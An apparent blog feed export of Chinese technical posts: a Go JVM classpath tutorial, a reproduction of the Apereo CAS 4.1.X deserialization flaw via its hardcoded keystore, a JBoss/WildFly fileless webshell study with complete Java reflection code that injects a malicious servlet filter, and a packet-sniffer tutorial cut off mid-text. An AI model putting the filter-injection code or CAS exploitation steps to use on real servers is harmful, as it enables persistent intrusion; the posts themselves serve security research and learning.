0&#123;        cmd.class = args[0]        cmd.args = args[1:]    &#125;    return cmd&#125;</code></pre><h4 id="Entry接口"><a href="#Entry接口" class="headerlink" title="Entry接口"></a>Entry接口</h4><p>在classpath目录下创建entry.go</p><pre><code class="go">package classpathimport (    &quot;os&quot;    &quot;strings&quot;)const pathListSeparator = string(os.PathListSeparator)//存放路径分隔符type Entry interface &#123;    readClass(className string)([]byte, Entry, error)    String() string&#125;func newEntry(path string) Entry&#123;    if strings.Contains(path, pathListSeparator)&#123;        return newCompositeEntry(path)    &#125;    //判断是否是*结尾    if strings.HasSuffix(path, &quot;*&quot;)&#123;        return newWildcardEntry(path)    &#125;    if strings.HasSuffix(path, &quot;.jar&quot;) ||         strings.HasSuffix(path, &quot;.JAR&quot;) ||         strings.HasSuffix(path, &quot;.zip&quot;) ||        strings.HasSuffix(path, &quot;.ZIP&quot;)&#123;        return newZipEntry(path)    &#125;    return newDirEntry(path)&#125;</code></pre><p>定义常量pathListSeparator表示路径分隔符，定义一个接口Entry其中包含readClass方法和String方法，String类似于Java的toString方法，用来打印。</p><h5 id="DirEntry"><a href="#DirEntry" class="headerlink" title="DirEntry"></a>DirEntry</h5><p>在相同目录下创建entry_dir.go，DirEntry用来存放绝对路径。</p><pre><code class="go">package classpathimport (    &quot;io/ioutil&quot;    &quot;path/filepath&quot;)type DirEntry struct &#123;    absDir string&#125;func (self *DirEntry) String() string &#123;    return self.absDir&#125;func newDirEntry(path string) *DirEntry&#123;    absDir, err := filepath.Abs(path)    if err != nil &#123;        panic(err)    &#125;    return &amp;DirEntry&#123;absDir&#125;&#125;func (self *DirEntry) readClass(className string)([]byte, Entry, error)&#123;    fileName := filepath.Join(self.absDir, className)    data, err := ioutil.ReadFile(fileName)    return data, self, err&#125;</code></pre><h5 id="ZipEntry"><a href="#ZipEntry" class="headerlink" title="ZipEntry"></a>ZipEntry</h5><p>ZipEntry表示ZIP和JAR文件的类路径因为寻找一次类文件关闭一次会导致效率降低因此在结构体中增加一个zipRC</p><pre><code class="go">package classpathimport (    &quot;archive/zip&quot;    &quot;errors&quot;    &quot;io/ioutil&quot;    &quot;path/filepath&quot;)type ZipEntry struct &#123;    absPath string    zipRC   *zip.ReadCloser&#125;func newZipEntry(path string) *ZipEntry &#123;    absPath, err := filepath.Abs(path)    if err != nil &#123;        panic(err)    &#125;    return &amp;ZipEntry&#123;absPath, nil&#125;&#125;func (self *ZipEntry) readClass(className string) ([]byte, Entry, error) &#123;    if self.zipRC == nil &#123;        err := self.openJar()        if err != nil &#123;            return nil, nil, err        &#125;    &#125;    classFile := self.findClass(className)    if classFile == nil &#123;        return nil, nil, errors.New(&quot;class not found: &quot; + className)    &#125;    data, err := readClass(classFile)    return data, self, err&#125;// todo: close zipfunc (self *ZipEntry) openJar() error &#123;    r, err := zip.OpenReader(self.absPath)    if err == nil &#123;        self.zipRC = r    &#125;    return err&#125;func (self *ZipEntry) findClass(className string) *zip.File &#123;    for _, f := range self.zipRC.File &#123;        if f.Name == className &#123;            return f        &#125;    &#125;    return nil&#125;func readClass(classFile *zip.File) ([]byte, error) &#123;    rc, err := classFile.Open()    if err != nil &#123;        return nil, err    &#125;    // read class data    data, err := ioutil.ReadAll(rc)    rc.Close()    if err != nil &#123;        return nil, err    &#125;    return data, nil&#125;func (self *ZipEntry) String() string &#123;    return self.absPath&#125;</code></pre><h5 id="CompositeEntry"><a href="#CompositeEntry" class="headerlink" title="CompositeEntry"></a>CompositeEntry</h5><pre><code class="go">package classpathimport (    &quot;errors&quot;    &quot;strings&quot;)type CompositeEntry []Entryfunc newCompositeEntry(pathList string) CompositeEntry&#123;    compositeEntry := []Entry&#123;&#125;    for _, path := range strings.Split(pathList,        pathListSeparator)&#123;        entry := newEntry(path)        compositeEntry = append(compositeEntry, entry)    &#125;    return compositeEntry&#125;func (self CompositeEntry) readClass(className string)([]byte, Entry, error)&#123;    for _, entry := range self &#123;        data, from, err := entry.readClass(className)        if err == nil&#123;            return data, from, nil        &#125;    &#125;    return nil, nil, errors.New(&quot;class not found: &quot; +        className)&#125;func (self CompositeEntry) String() string&#123;    strs := make([]string, len(self))    for i, entry := range self&#123;        strs[i] = entry.String()    &#125;    return strings.Join(strs, pathListSeparator)&#125;</code></pre><h5 id="WildcardEntry"><a href="#WildcardEntry" class="headerlink" title="WildcardEntry"></a>WildcardEntry</h5><p>本质上WildcardEntry也是CompositeEntry，调用Walk函数编列aseDir创建ZIP实体。这里用到了函数式编程。</p><pre><code class="go">package classpathimport (    &quot;os&quot;    &quot;path/filepath&quot;    &quot;strings&quot;)func newWildcardEntry(path string) CompositeEntry&#123;    baseDir := path[:len(path) - 1] //去除 *    compositeEntry := []Entry&#123;&#125;    walkFn := func(path string, info os.FileInfo, err error) error&#123;        if err != nil &#123;            return err        &#125;        if info.IsDir() &amp;&amp; path != baseDir&#123;            return filepath.SkipDir        &#125;        if strings.HasSuffix(path, &quot;.jar&quot;) ||    strings.HasSuffix(path, &quot;.JAR&quot;)&#123;            jarEntry := newZipEntry(path)            compositeEntry = append(compositeEntry, jarEntry)        &#125;        return nil    &#125;    filepath.Walk(baseDir, walkFn)    return compositeEntry&#125;</code></pre><p>优先使用用户输入-Xjre选项作为jre目录。如果没有输入该选项，则中当前目录下寻找jre目录。如果找不到，尝试使用JAVA_HOME。<br>classpath.go</p><pre><code class="go">package classpathimport (    &quot;os&quot;    &quot;path/filepath&quot;)type Classpath struct&#123;    bootClasspath Entry    extClasspath Entry    userClasspath Entry&#125;func Parse(jreOption, cpOption string) *Classpath&#123;    cp := &amp;Classpath&#123;&#125;    cp.parseBootAndExtClasspath(jreOption)    cp.parseUserClasspath(cpOption)    return cp&#125;func (self *Classpath) parseBootAndExtClasspath(jreOption string)&#123;    jreDir := getJreDir(jreOption)    // jre/lib/*    jreLibPath := filepath.Join(jreDir, &quot;lib&quot;, &quot;*&quot;)    self.bootClasspath = newWildcardEntry(jreLibPath)    // jre/lib/ext/*    jreExtPAth := filepath.Join(jreDir, &quot;lib&quot;, &quot;ext&quot;, &quot;*&quot;)    self.extClasspath = newWildcardEntry(jreExtPAth)&#125;func getJreDir(jreOption string) string&#123;    if jreOption != &quot;&quot; &amp;&amp; exists(jreOption)&#123;        return jreOption    &#125;    if exists(&quot;./jre&quot;)&#123;        return &quot;./jre&quot;    &#125;    if jh := os.Getenv(&quot;JAVA_HOME&quot;); jh != &quot;&quot; &#123;        return filepath.Join(jh, &quot;jre&quot;)    &#125;    panic(&quot;Can not find jre folder! &quot;)&#125;func exists(path string) bool &#123;    if _, err := os.Stat(path); err != nil&#123;        if os.IsNotExist(err) &#123;            return false        &#125;    &#125;    return true&#125;func (self *Classpath) parseUserClasspath(cpOption string)&#123;    if cpOption == &quot;&quot;&#123;        cpOption = &quot;.&quot;    &#125;    self.userClasspath = newEntry(cpOption)&#125;// 如果用户未提供-cp选项则使用当前目录作为用户路径func (self *Classpath) ReadClass(className string) ([]byte, Entry, error)&#123;    className = className + &quot;.class&quot;    if data, entry, err :=        self.bootClasspath.readClass(className); err == nil &#123;        return data, entry, err    &#125;    if data, entry, err :=        self.extClasspath.readClass(className); err == nil&#123;        return data, entry, err    &#125;    return self.userClasspath.readClass(className)&#125;func (self *Classpath) String() string&#123;    return self.userClasspath.String()&#125;</code></pre><p>然后修改一下StartJVM</p><pre><code class="go">func startJVM(cmd *CMD)&#123;    cp := classpath.Parse(cmd.XjreOption, cmd.cpOption)    fmt.Printf(&quot;classpath: %v class: %v args: %v\n&quot;,        cp, cmd.class, cmd.args)    className := strings.Replace(cmd.class, &quot;.&quot;, &quot;/&quot;, -1)    classData, _, err := cp.ReadClass(className)    if err != nil &#123;        fmt.Printf(&quot;Could not find or load main class %s\n&quot;,            cmd.class)        return    &#125;    fmt.Printf(&quot;class data: %v\n&quot;, classData)&#125;</code></pre><h3 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvelors08pj60w20mw43n02.jpg" alt=""></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>《自己动手写Java虚拟机》</p>]]></content>
    
    <summary type="html">
    
      手撸一个JVM虚拟机--命令行工具
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>Apereo Cas 4.1.X 反序列化漏洞复现</title>
    <link href="http://yoursite.com/2021/09/15/Apereo%20Cas%204.1.X%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2021/09/15/Apereo%20Cas%204.1.X%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-09-15T08:23:01.000Z</published>
    <updated>2021-09-15T08:25:56.715Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apereo-Cas-4-1-X-反序列化漏洞复现"><a href="#Apereo-Cas-4-1-X-反序列化漏洞复现" class="headerlink" title="Apereo Cas 4.1.X 反序列化漏洞复现"></a>Apereo Cas 4.1.X 反序列化漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个漏洞挺简单的就简单的跟一下利用链，并没有什么东西。最近沉迷永劫无间，没有好好学习呜呜。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>IDEA 2021<br>CAS Server Webapp » 4.1.1<br>tomcat 7<br><a href="https://mvnrepository.com/artifact/org.jasig.cas/cas-server-webapp/4.1.1">下载地址</a><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucr9v3k2rj619t0u0tdq02.jpg" alt=""></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>部署完成后就是如下的页面<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucraqg9hej61900u0dkp02.jpg" alt=""><br>在org.springframework.web.servlet.FrameworkServlet#doPost下断点，因为登陆发送的是Post包跟入<br>org.springframework.web.servlet.DispatcherServlet#doService，doDispatch对request、response进行处理<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucpry4kkxj61f80hcgp502.jpg" alt=""></p><p>跟入doDispatch进入如下函数org.springframework.web.servlet.DispatcherServlet#doDispatch，跟入handle函数，而handle 实际上是一个 Implement<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucptm8ybsj61m40k0gpn02.jpg" alt=""></p><p>在org.springframework.webflow.mvc.servlet.FlowHandlerAdapter#handle函数中getFlowExecutionKey对request进行处理，获得Post包中的execution字段值<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucpuphtaij61me0gkn4902.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucrzxxlgfj61e00bk76o02.jpg" alt=""><br>org.jasig.cas.web.flow.CasDefaultFlowUrlHandler#getFlowExecutionKey<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucq22h37aj61dw0dkjuu02.jpg" alt=""><br>org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository#parseFlowExecutionKey<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucq68b5l4j61nk04ktaa02.jpg" alt=""><br>在org.jasig.spring.webflow.plugin.ClientFlowExecutionKey中对key值进行了切片，看见第一段是uid，第二段才是加密后的字节码，这里会比较数组长度是否为2，如果不为2则会抛出异常<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucq7qwpixj61mk0lswk302.jpg" alt=""><br>下面则是对base64进行解密<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucq8oswzcj61m404e75w02.jpg" alt=""><br>而反序列化的利用点则是在org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository#getFlowExecution，首先先获取一个byte数组，随后传入到decode中<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucqon7ln5j620i0k2n4i02.jpg" alt=""></p><p>而反序列化的过程以及在下图用箭头指出流程</p><p>org.jasig.spring.webflow.plugin.EncryptedTranscoder#decode<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucqztelwcj62360kwwjp02.jpg" alt=""><br>再看一下加密算法，算法是 AES/CBC/PKCS7 ，KeyStore 是硬编码在 spring-webflow-client-repo-1.0.0.jar/etc/keystore.jcek<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucsar95fej61gw09sgnv02.jpg" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以使用ysoserlia的cc链直接进行攻击，利用org.jasig.spring.webflow.plugin.EncryptedTranscoder.encode 进行加密即可，然后替换 execution 这个参数位置的值。记得要注意格式否则会报错。代码不贴出。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucsd2n5sfj624q0tkk8q02.jpg" alt=""></p><h3 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h3><p>而回显的问题在这篇<a href="http://www.00theway.org/2020/01/04/apereo-cas-rce/">文章</a>里面有提到</p><blockquote><p>org.springframework.webflow.context.ExternalContextHolder.getExternalContext()</p></blockquote><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><p>这里用的是cc2的利用链，图上写的是cc6因为我写的cc6有点小问题，有段代码我之前改了，但是忘记放哪个地方了，然后就改用cc2了。需要注意的是这里的getPayload函数是之前返回PriorityQueue的实例，因为在encryptedTranscoder#encode中会进行一次writeObject所以直接返回queue就行了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gug959kthcj60wk0dy76n02.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gug99436whj61b20na77402.jpg" alt=""></p><p>复现的时候也是没注意浪费了好多时间。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gug9azw6m4j61b80u0tlh02.jpg" alt=""></p><h2 id="漏洞回显"><a href="#漏洞回显" class="headerlink" title="漏洞回显"></a>漏洞回显</h2><blockquote><p>org.springframework.webflow.context.ExternalContextHolder.getExternalContext()</p></blockquote><p>可以通过如上函数获取上下午，实现回显。我是直接写一个类写进了static中，直接触发。<br>也可以通过下面的函数触发恶意类的初始化，代码为就不粘贴了。</p><blockquote><p>org.springframework.cglib.core.ReflectUtils.defineClass().newInstance()<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1guhdxkydinj61am0u0naw02.jpg" alt=""></p></blockquote><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.lmxspace.com/2020/03/09/Apereo-CAS-4-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#Apereo-CAS-4-1-X-4-1-6-1">http://www.lmxspace.com/2020/03/09/Apereo-CAS-4-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#Apereo-CAS-4-1-X-4-1-6-1</a></p>]]></content>
    
    <summary type="html">
    
      Apereo Cas 4.1.X 反序列化漏洞复现
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>JBoss无文件webshell研究</title>
    <link href="http://yoursite.com/2021/08/26/JBoss%E6%97%A0%E6%96%87%E4%BB%B6webshell%E7%A0%94%E7%A9%B6/"/>
    <id>http://yoursite.com/2021/08/26/JBoss%E6%97%A0%E6%96%87%E4%BB%B6webshell%E7%A0%94%E7%A9%B6/</id>
    <published>2021-08-26T08:27:01.000Z</published>
    <updated>2021-08-26T08:28:18.120Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JBoss无文件webshell研究"><a href="#JBoss无文件webshell研究" class="headerlink" title="JBoss无文件webshell研究"></a>JBoss无文件webshell研究</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在网上并没有怎么找到JBoss无文件shell的资料，只找到了宽字节的一篇，其中遇到了很多问题，不过还好自己也后来解决了，发现自己遇到了很多白痴问题，感觉自己好笨。。。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>IDEA 2021.3</li><li>wildfly-20.0.0.Final</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="如何生成Filter"><a href="#如何生成Filter" class="headerlink" title="如何生成Filter"></a>如何生成Filter</h3><p>先在IDEA中部署一个JBoss项目，然后在Filter中先断点，同时使用debug启动，来观察一下。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtu66mq5z2j61320hmmzz02.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtu68yx6azj61oi0g8dl902.jpg" alt=""><br>我们可以看见有个MangerFilter#createFilter函数，我们跟进</p><pre><code class="java">public void createFilter() throws ServletException &#123;        synchronized(this) &#123;            if (this.filter == null) &#123;                try &#123;                    this.handle = this.filterInfo.getInstanceFactory().createInstance();                &#125; catch (Exception var4) &#123;                    throw UndertowServletMessages.MESSAGES.couldNotInstantiateComponent(this.filterInfo.getName(), var4);                &#125;                Filter filter = (Filter)this.handle.getInstance();                (new LifecyleInterceptorInvocation(this.servletContext.getDeployment().getDeploymentInfo().getLifecycleInterceptors(), this.filterInfo, filter, new FilterConfigImpl(this.filterInfo, this.servletContext))).proceed();                this.filter = filter;            &#125;        &#125;    &#125;</code></pre><p>在MangerFilter#createFilter中如果Filter不存在那么就会调用LifecyleInterceptorInvocation来生成filter，其中使用到了两个参数：this.servletContext，this.filterInfo，所以如果要通过反射生成Filter我们需要传入这两个参数<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu6wjia78j613e04ywf802.jpg" alt=""></p><h3 id="如何获取filterInfo和servletContext"><a href="#如何获取filterInfo和servletContext" class="headerlink" title="如何获取filterInfo和servletContext"></a>如何获取filterInfo和servletContext</h3><p>在MangerFilter中跟入filterInfo，观察filterInfo初始化需要name及filter的名称，然后一个filterClass<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu75wdkbhj61be0iuwjf02.jpg" alt=""><br>综上所述，我们需要通过反射的生成filterInfo的代码如下</p><pre><code class="java"> Object evilFilterInfo = Class.forName(&quot;io.undertow.servlet.api.FilterInfo&quot;).getDeclaredConstructors()[0].newInstance(&quot;FilterTest&quot;, evilFilterClass);</code></pre><p>对于其中的evilFilterClass又如何生成？我们只需要自己写一个Filter然后生成class文件，进行读取并进行base64加密即可,然后通过反射调用defineClass生成一个evilFilterClass</p><pre><code class="java">BASE64Decoder b64Decoder = new sun.misc.BASE64Decoder();String codeClass = &quot;yv66vgAA....&quot;;Method defineClassM = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);defineClassM.setAccessible(true);evilFilterClass = (Class) defineClassM.invoke(Thread.currentThread().getContextClassLoader(), b64Decoder.decodeBuffer(codeClass), 0, b64Decoder.decodeBuffer(codeClass).length);      </code></pre><p>而defineClass为什么这么写的原因只需要自己通过IDEA观察一下就可以明白<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtu7y8k6pbj617g0u0juk02.jpg" alt=""><br>而我们需要获取servletContext我们跟入<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtu8e96ocjj60ve0dkn1902.jpg" alt=""><br>然后查找哪些地方使用了ServletContext，在ServletRequest中调用到了，而对于<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtu8gm1jfkj614y0e8dj302.jpg" alt=""><br>现在很简单了，我们主要想办法获取ServletRequestContext就可以，而在其中存在getCurrentServlet的方法可以获取<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu8jjbwdqj61f80rkqav02.jpg" alt=""></p><p>现在步骤清晰了，这里已经可以生成一个Filter了接下来我们需要做的就是获取内存中的filters，然后加入其中</p><h3 id="将生成的filter加入到内存中"><a href="#将生成的filter加入到内存中" class="headerlink" title="将生成的filter加入到内存中"></a>将生成的filter加入到内存中</h3><p>很巧的是我们刚刚获取的currrentServlet，就是ServletChain<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu8rrgtagj617y0toaim02.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu8s4sv18j61lo0dg78c02.jpg" alt=""><br>那么我们获取得到filters然后加入就完成了</p><pre><code class="java">Method getCurrentServletM = curContext.getClass().getMethod(&quot;getCurrentServlet&quot;);Object servletChain = getCurrentServletM.invoke(curContext);Field filtersF = servletChain.getClass().getDeclaredField(&quot;filters&quot;);filtersF.setAccessible(true);java.util.EnumMap filters = (EnumMap) filtersF.get(servletChain);ArrayList filterList = (ArrayList) filters.get(DispatcherType.REQUEST);filterList.add(evilManagedFilter);</code></pre><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><h3 id="filterArrayList为null"><a href="#filterArrayList为null" class="headerlink" title="filterArrayList为null"></a>filterArrayList为null</h3><p>现在证实一下内存马是否成功，但是却失败了，报错显示的是空指针异常，<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu8ydp2m7j61400u0jy902.jpg" alt=""><br>但是为什么会报错，为也没想明白，就尝试看看各个阶段的一些关键参数的值<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu91q09z7j61gq0gq43m02.jpg" alt=""><br>可以看见filterList为null，<br>当时我对着屏幕发了好久的呆，然后后来突然想到了arraylist为null时不能成功的加入，因此进行尝试，这是因为在当前页面filter是空的，我们只要自己先把filter写进来就可以添加了<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu98c26icj61uu0d2whk02.jpg" alt=""><br>现在成功加入了</p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu9j19viij60u60u0gnq02.jpg" alt=""></p><p>完整代码：</p><pre><code>    Method currentM = null;        currentM = Class.forName(&quot;io.undertow.servlet.handlers.ServletRequestContext&quot;).getDeclaredMethod(&quot;current&quot;);        Object curContext = currentM.invoke(null);        Method getCurrentServletM = curContext.getClass().getMethod(&quot;getCurrentServlet&quot;);        Object servletChain = getCurrentServletM.invoke(curContext);        Field filtersF = servletChain.getClass().getDeclaredField(&quot;filters&quot;);        filtersF.setAccessible(true);        java.util.EnumMap filters = (EnumMap) filtersF.get(servletChain);        String evilFilterClassName = &quot;FilterTest&quot;;        Class evilFilterClass = null;        try &#123;            evilFilterClass = Class.forName(evilFilterClassName);        &#125; catch (ClassNotFoundException e) &#123;            BASE64Decoder b64Decoder = new sun.misc.BASE64Decoder();            String codeClass = &quot;yv66vgA&quot;; Method defineClassM = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);            defineClassM.setAccessible(true);            evilFilterClass = (Class) defineClassM.invoke(Thread.currentThread().getContextClassLoader(), b64Decoder.decodeBuffer(codeClass), 0, b64Decoder.decodeBuffer(codeClass).length);        &#125;        ArrayList filterList = (ArrayList) filters.get(DispatcherType.REQUEST);        Object evilFilterInfo = Class.forName(&quot;io.undertow.servlet.api.FilterInfo&quot;).getDeclaredConstructors()[0].newInstance(&quot;FilterTest&quot;, evilFilterClass);        Field servletRequestF = curContext.getClass().getDeclaredField(&quot;servletRequest&quot;);        servletRequestF.setAccessible(true);        Object obj = servletRequestF.get(curContext);        Field servletContextF = obj.getClass().getDeclaredField(&quot;servletContext&quot;);        servletContextF.setAccessible(true);        Object servletContext = servletContextF.get(obj);        Object evilManagedFilter = Class.forName(&quot;io.undertow.servlet.core.ManagedFilter&quot;).getDeclaredConstructors()[0].newInstance(evilFilterInfo, servletContext);        filterList.add(evilManagedFilter);</code></pre><p> ## 总结</p><p>其实这个代码还是有些问题，还没有解决。。。。。 </p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/potatsoSec/p/13168341.html">宽字节安全-JBoss无文件webshe<br>ll</a></p><p><a href="https://www.cnblogs.com/higgincui/p/5772514.html">多个Filter的执行顺序</a></p>]]></content>
    
    <summary type="html">
    
      JBoss无文件webshell研究
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>Golang学习笔记 编写嗅探器</title>
    <link href="http://yoursite.com/2021/08/10/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20%E7%BC%96%E5%86%99%E5%97%85%E6%8E%A2%E5%99%A8/"/>
    <id>http://yoursite.com/2021/08/10/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20%E7%BC%96%E5%86%99%E5%97%85%E6%8E%A2%E5%99%A8/</id>
    <published>2021-08-10T09:14:01.000Z</published>
    <updated>2021-08-10T09:15:03.454Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Golang学习笔记-编写嗅探器"><a href="#Golang学习笔记-编写嗅探器" class="headerlink" title="Golang学习笔记 编写嗅探器"></a>Golang学习笔记 编写嗅探器</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文学习了《白帽子安全开发实战》</p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ul><li>GoLand</li><li>go version go1.16 darwin/arm64</li><li>github.com/google/gopacket</li></ul><p>github.com/google/gopacket包的安装在其它平台上还需要安装其它东西，因为我使用的是macOS，已经默认安装了libpcap-dev，所以只需要在项目下执行如下命令即可。</p><blockquote><p>go mod init xxxx<br>go get github.com/google/gopacket</p></blockquote><h2 id="gopacket包示例"><a href="#gopacket包示例" class="headerlink" title="gopacket包示例"></a>gopacket包示例</h2><p>以下是gopacket包的示例，用来捕获数据包</p><pre><code class="go">import (    &quot;fmt&quot;    &quot;github.com/google/gopacket&quot;    &quot;github.com/google/gopacket/layers&quot;    &quot;github.com/google/gopacket/pcap&quot;    &quot;log&quot;    &quot;strings&quot;    &quot;time&quot;)var (    device = &quot;en0&quot;    snapshotLength int32 = 1024    promiscuous = false    timeout = 30 * time.Second    handle * pcap.Handle    err error)func main() &#123;    handle, err := pcap.OpenLive(device, snapshotLength, promiscuous, timeout)    if err != nil &#123;        log.Fatal(err)    &#125;    defer handle.Close()    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())    for packet := range packetSource.Packets()&#123;        fmt.Println(packet.Dump())        fmt.Println(strings.Repeat(&quot;-&quot;,50))    &#125;&#125;</code></pre><p>代码很简单pcap.Openlive函数表示实时监听网卡的数据，其中的四个值表示的是网卡设备名，监听数据包大小，网卡是否为混杂模式，超时时间。同时需要使用root权限运行。运行后需要等待一段好司机，刚刚开始为没耐心，以为是自己写错了。</p><p>运行情况如下：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtbr8vinc1j61im0u044h02.jpg" alt=""></p><h2 id="协议分析程序的编写"><a href="#协议分析程序的编写" class="headerlink" title="协议分析程序的编写"></a>协议分析程序的编写</h2><h3 id="OSI模型"><a href="#OSI模型" class="headerlink" title="OSI模型"></a>OSI模型</h3><h4 id="第7层-应用层"><a href="#第7层-应用层" class="headerlink" title="第7层 应用层"></a>第7层 应用层</h4><p>应用层（Application Layer）提供为应用软件而设计的接口，以设置与另一应用软件之间的通信。例如：HTTP、HTTPS、FTP、Telnet、SSH、SMTP、POP3等。</p><h4 id="第6层-表示层"><a href="#第6层-表示层" class="headerlink" title="第6层 表示层"></a>第6层 表示层</h4><p>表示层（Presentation Layer）把数据转换为能与接收者的系统格式兼容并适合传输的格式。</p><h4 id="第5层-会话层"><a href="#第5层-会话层" class="headerlink" title="第5层 会话层"></a>第5层 会话层</h4><p>会话层（Session Layer）负责在数据传输中设置和维护计算机网络中两台计算机之间的通信连接。</p><h4 id="第4层-传输层"><a href="#第4层-传输层" class="headerlink" title="第4层 传输层"></a>第4层 传输层</h4><p>传输层（Transport Layer）把传输表头（TH）加至数据以形成数据包。传输表头包含了所使用的协议等发送信息。例如:传输控制协议（TCP）等。</p><h4 id="第3层-网络层"><a href="#第3层-网络层" class="headerlink" title="第3层 网络层"></a>第3层 网络层</h4><p>网络层（Network Layer）决定数据的路径选择和转寄，将网络表头（NH）加至数据包，以形成分组。网络表头包含了网络资料。例如:互联网协议（IP）等。</p><h4 id="第2层-数据链路层"><a href="#第2层-数据链路层" class="headerlink" title="第2层 数据链路层"></a>第2层 数据链路层</h4><p>数据链路层（Data Link Layer）负责网络寻址、错误侦测和改错。当表头和表尾被加至数据包时，会形成信息框（Data Frame）。数据链表头（DLH）是包含了物理地址和错误侦测及改错的方法。数据链表尾（DLT）是一串指示数据包末端的字符串。例如以太网、无线局域网（Wi-Fi）和通用分组无线服务（GPRS）等。</p><p>分为两个子层：逻辑链路控制（logical link control，LLC）子层和介质访问控制（Media access control，MAC）子层。</p><h4 id="第1层-物理层"><a href="#第1层-物理层" class="headerlink" title="第1层 物理层"></a>第1层 物理层</h4><p>物理层（Physical Layer）在局部局域网上发送数据帧（Data 